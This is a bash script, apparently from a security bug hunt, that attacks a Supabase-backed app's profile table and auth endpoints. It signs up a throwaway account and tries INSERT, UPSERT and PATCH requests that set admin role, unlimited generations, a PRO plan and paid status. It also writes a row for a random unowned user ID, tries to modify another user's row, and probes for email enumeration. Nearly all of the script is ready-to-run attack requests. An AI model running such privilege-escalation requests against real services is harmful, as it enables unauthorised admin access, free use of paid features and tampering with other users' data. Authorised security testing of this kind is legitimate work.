#!/bin/bash
# Hunt 4: profile INSERT/upsert privilege-escalation tests with a SECOND throwaway auth user.
# Only our own test accounts are modified.
source "$(dirname "$0")/env.sh"

TS=$(date +%s)
EMAIL2="vulnrat-b$(echo $TS | tail -c 6)@dropmail.me"
PASS2="VulnRat!Audit2026"

echo "########## 1. Create second test account ##########"
code=$(curl -sS -k -m 30 -A "$UA" -H "apikey: $KEY" -H "Content-Type: application/json" \
  -d "{\"email\":\"$EMAIL2\",\"password\":\"$PASS2\"}" -o /tmp/signup2.json -w "%{http_code}" "$SUPA/auth/v1/signup")
echo "signup $EMAIL2 -> HTTP $code"
python3 - <<'PY'
import json
d=json.load(open('/tmp/signup2.json'))
tok=d.get('access_token')
if tok:
    open('/tmp/token2.txt','w').write(tok)
    open('/tmp/user2.txt','w').write(d.get('user',{}).get('id',''))
    print('user2 id:', d.get('user',{}).get('id'))
    print('email:', d.get('user',{}).get('email'))
else:
    print('signup body keys:', list(d.keys()), str(d)[:400])
PY
TOKEN2="$(cat /tmp/token2.txt 2>/dev/null)"
USER2="$(cat /tmp/user2.txt 2>/dev/null)"
echo "token2 len=${#TOKEN2} user2=$USER2"

echo "########## 2. Was a profiles row auto-created for user2? ##########"
req GET "$SUPA/rest/v1/profiles?select=*&user_id=eq.$USER2" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN2"

echo "########## 3. INSERT privileged profile for user2 (fresh account born admin) ##########"
req POST "$SUPA/rest/v1/profiles" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN2" -H "Content-Type: application/json" -H "Prefer: return=representation" \
  -d "{\"user_id\":\"$USER2\",\"role\":\"admin\",\"generations_left\":9999,\"activePlan\":\"PRO\",\"payment_status\":\"paid\"}"

echo "########## 4. INSERT privileged profile with a random (unowned) user_id ##########"
RANDOM_UUID=$(python3 -c 'import uuid;print(uuid.uuid4())')
req POST "$SUPA/rest/v1/profiles" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN2" -H "Content-Type: application/json" -H "Prefer: return=representation" \
  -d "{\"user_id\":\"$RANDOM_UUID\",\"role\":\"admin\",\"generations_left\":9999,\"activePlan\":\"PRO\"}"

echo "########## 5. UPSERT on own (first) profile with admin role - merge-duplicates ##########"
U1="23c8fb62-49c5-42d9-b031-906b97cd1cb4"
req POST "$SUPA/rest/v1/profiles?on_conflict=user_id" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -H "Prefer: resolution=merge-duplicates,return=representation" \
  -d "{\"user_id\":\"$U1\",\"role\":\"admin\",\"generations_left\":9999,\"activePlan\":\"PRO\",\"payment_status\":\"paid\"}"

echo "########## 6. UPSERT on own profile with only privileged cols (no insert-time trigger gap?) ##########"
req POST "$SUPA/rest/v1/profiles?on_conflict=user_id" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -H "Prefer: resolution=ignore-duplicates,return=representation" \
  -d "{\"user_id\":\"$U1\",\"role\":\"admin\",\"generations_left\":9999}"

echo "########## 7. Re-read own profile to verify current privileges ##########"
req GET "$SUPA/rest/v1/profiles?select=user_id,role,activePlan,generations_left,payment_status&user_id=eq.$U1" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN"

echo "########## 8. PATCH attempt on user2 profile as user2 (role=admin) ##########"
req PATCH "$SUPA/rest/v1/profiles?user_id=eq.$USER2" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN2" -H "Content-Type: application/json" -H "Prefer: return=representation" \
  -d '{"role":"admin","generations_left":9999}'

echo "########## 9. Try UPDATE on another user's row (user2 tries to modify user1) ##########"
req PATCH "$SUPA/rest/v1/profiles?user_id=eq.$U1" -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN2" -H "Content-Type: application/json" -H "Prefer: return=representation" \
  -d '{"role":"admin"}'

echo "########## 10. user2 duplicate-signup email enumeration check ##########"
code=$(curl -sS -k -m 20 -A "$UA" -H "apikey: $KEY" -H "Content-Type: application/json" \
  -d "{\"email\":\"$EMAIL2\",\"password\":\"$PASS2\"}" -o /tmp/dup.json -w "%{http_code}" "$SUPA/auth/v1/signup")
echo "signup same email -> HTTP $code : $(head -c 300 /tmp/dup.json | tr -d '\n')"

echo "########## 11. user2 password/login checks ##########"
code=$(curl -sS -k -m 20 -A "$UA" -H "apikey: $KEY" -H "Content-Type: application/json" \
  -d "{\"email\":\"$EMAIL2\",\"password\":\"wrong-password\"}" -o /tmp/badlogin.json -w "%{http_code}" "$SUPA/auth/v1/token?grant_type=password")
echo "bad login -> HTTP $code : $(head -c 200 /tmp/badlogin.json | tr -d '\n')"
code=$(curl -sS -k -m 20 -A "$UA" -H "apikey: $KEY" -H "Content-Type: application/json" \
  -d "{\"email\":\"$EMAIL2\",\"password\":\"$PASS2\"}" -o /tmp/oklogin.json -w "%{http_code}" "$SUPA/auth/v1/token?grant_type=password")
echo "good login -> HTTP $code (token present: $(grep -c access_token /tmp/oklogin.json))"
